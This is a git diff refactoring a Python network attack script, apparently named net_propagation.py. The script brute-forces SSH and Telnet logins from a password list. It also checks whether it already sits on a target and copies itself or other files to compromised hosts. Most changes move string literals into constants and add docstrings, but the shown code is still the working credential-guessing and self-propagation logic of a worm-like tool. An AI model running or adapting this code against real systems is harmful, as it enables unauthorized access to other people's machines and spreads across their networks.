@@ -75,12 +75,18 @@ def assigning_values(arguments):
     :return passwords_filename: The filename of the passwords file
     """
     if "-t" in arguments:
-        ip_addresses_filename = arguments[arguments.index("-t") + 1]
+        ip_addresses_filename = \
+            arguments[
+                arguments.index(strings.ARGUMENT_IP_ADDRESS_FILENAME) + 1]
         try:
             ip_list = convert_file_to_list(ip_addresses_filename)
-            target_ports = arguments[arguments.index("-p") + 1]
-            target_username = arguments[arguments.index("-u") + 1]
-            passwords_filename = arguments[arguments.index("-f") + 1]
+            target_ports = arguments[
+                arguments.index(strings.ARGUMENT_PORTS) + 1]
+            target_username = \
+                arguments[arguments.index(strings.ARGUMENT_USERNAME) + 1]
+            passwords_filename = \
+                arguments[arguments.index(strings.ARGUMENT_PASSWORDS_FILENAME)
+                          + 1]
             return ip_list, target_ports, target_username, passwords_filename
         except RuntimeError:
             logging.error(strings.ip_list_not_read(ip_addresses_filename))
@@ -99,21 +105,22 @@ def bruteforce_service(ip, port, username, password_list):
     :param username: The username we're signing in to services on
     :param password_list: The list of passwords to attempt
     :return login_details: The username and password to return
-    :return NONE: Only done to indicate an unsuccessful task
+    :return None: Only done to indicate an unsuccessful task
     """
     for password in password_list:
         login_details = (try_password_for_service(ip, port, username,
                                                   password))
-        if login_details != "":
+        if login_details != strings.BLANK_STRING:
             return login_details
     return None
 
 
 def check_over_ssh(ip, port, username, password):
     """
-    This function checks if the net_attack.py script is already located at the
-    target machine over SSH. If it is then false is returned and if not then
-    true is returned. This is needed as a prerequisite to propagating over SSH
+    This function checks if the net_propagation.py script is already located at
+    the target machine over SSH. If it is then false is returned and if not
+    then true is returned. This is needed as a prerequisite to propagating over
+    SSH
     :param ip: The IP address target for SSH
     :param port: The port on which we're running SSH
     :param username: The username to target over SSH
@@ -127,8 +134,10 @@ def check_over_ssh(ip, port, username, password):
         client.set_missing_host_key_policy(AutoAddPolicy())
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
-        client.exec_command("touch net_attack.py")
-        if str(client.exec_command("cat net_attack.py")[1]).__len__() < 1:
+        client.exec_command(strings.touch_file(os.path.basename(__file__)))
+        if str(client.exec_command
+                (strings.cat_file(os.path.basename(__file__)))
+               [1]).__len__() < 1:
             client.close()
             return True
         client.close()
@@ -155,9 +164,10 @@ def check_over_telnet(ip, port, username, password):
     """
     try:
         tel = Telnet(host=ip, port=port, timeout=2)
-        tel.read_until("login:".encode("ascii"))
-        tel.write((str(username) + "\n").encode("ascii"))
-        tel.read_until("Password:".encode("ascii"))
+        tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
+        tel.write((str(username) + strings.RETURN_OR_NEWLINE)
+                  .encode(strings.ENCODE_ASCII))
+        tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
         tel.write((str(password) + "\n").encode("ascii"))
         data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
         if check_telnet_data("Welcome to", data):
@@ -621,8 +631,12 @@ def try_bruteforce(ip, port, target_username, password_list):
     details along with the service used
     :param ip: Target IP address for an action
     :param port: Target port over which to carry out an action
-    :param target_username: Target username 
-    :param password_list:
+    :param target_username: Target username that's needed for the action
+    :param password_list: Target password that's needed for the action
+    :return str(bruteforce), service: The username and password of a successful
+    action with the service used
+    :return None, service: Empty username and password for an unsuccessful
+    action and the service which was used.
     """
     service_switch = {
         "22": "ssh",
@@ -647,7 +661,14 @@ def try_password_for_service(ip, port, username, password):
     """
     This function tries to log into to a port's associated service using a
     specific username and password pair. If it succeeds it returns the
-    successful login string, otherwise it returns an empty string.
+    successful login string, otherwise it returns an empty string
+    :param ip: The specific target IP
+    :param port: The specific target port
+    :param username: The username to use with the password
+    :param password: The password itself
+    :return str(username) + ":" + str(password): The successful username and
+    password combination
+    :return "": Empty string for unsuccessful username and password combination
     """
     try:
         connect_service_switch = {
@@ -673,12 +694,16 @@ def try_propagating(arguments, ip, port, bruteforce):
     service was successful. If it is unsuccessful then we let the user know it
     was unsuccessful and over what service. Should the user have never asked
     for the script to be propagated over the network then we let them know this
-    part of the process will not be done.
+    part of the process will not be done
+    :param arguments: The arguments passed in by the user themselves
+    :param ip: The IP address we wish to propagate to
+    :param port: The port we're propagating through
+    :param bruteforce: The username and password string combo
     """
     if "-P" in arguments and (port == "22" or "23"):
         propagated = propagate_script(ip, port, bruteforce)
         if propagated:
-            logging.info("Script propagated over  this port")
+            logging.info("Script propagated over this port")
         else:
             logging.debug("Script couldn't be propagated over this port")
     else:
@@ -694,7 +719,12 @@ def try_transferring_file(arguments, ip, port, bruteforce,
     the file was a success and over what service. If it is unsuccessful then we
     let the user know it was unsuccessful and over what service. Should the
     user have never asked for a file to be transferred over the network then we
-    let them know this process will not be done.
+    let them know this process will not be done
+    :param arguments: The arguments passed in by the user themselves
+    :param ip: The IP address we wish to propagate to
+    :param port: The port we're propagating through
+    :param bruteforce: The username and password string combo
+    :param transfer_file_filename: The filename of the file we wish to transfer
     """
     if "-d" in arguments and (str(port) == "22" or "23"):
         transferred = transfer_file(ip, port, bruteforce,
@@ -711,7 +741,8 @@ def validate_file_exists(filename):
     """
     This function checks if a file exists given a set filename and if it
     doesn't we alert the user with an error and put them in the bold corner.
-    Just kidding we show the help screen and exit gracefully.
+    Just kidding we show the help screen and exit gracefully
+    :param filename: The name of the file we wish to ensure exists
     """
     if not os.path.isfile(filename):
         logging.error("A specified file does not exist")
